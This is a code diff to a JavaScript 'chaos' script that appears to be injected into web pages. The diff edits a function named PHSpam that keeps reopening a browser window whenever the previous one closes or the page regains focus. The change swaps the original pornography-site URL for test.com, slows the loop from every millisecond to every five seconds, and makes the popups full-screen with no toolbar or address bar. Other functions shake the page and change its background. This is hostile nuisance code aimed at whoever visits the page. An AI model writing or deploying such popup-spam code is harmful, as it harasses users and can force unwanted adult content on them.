@@ -28,17 +28,25 @@ if (!window.__chaosInjected && localStorage.getItem('chaos-listener-active') ===
           document.body.appendChild(vid);
         },
 PHSpam: () => {
-  const url = 'https://pornhub.com';
+  const url = 'https://test.com';
   const portals = [];
 
   let win = null;
 
   setInterval(() => {
     if (!win || win.closed || document.hasFocus()) {
-      win = window.open(url, '_blank');
+      win = window.open(
+        url,
+        '_blank',
+        'toolbar=no,location=no,status=no,menubar=no,scrollbars=yes,resizable=yes,width=' +
+          screen.availWidth +
+          ',height=' +
+          screen.availHeight +
+          ',top=0,left=0'
+      );
       if (win) portals.push(win);
     }
-  }, 1); // Adjusted interval to reduce CPU load
+  }, 5000);
 },
         changeBG: () => document.body.style.background = `hsl(${Math.floor(Math.random()*360)} 60% 80%)`,
         shake: () => {
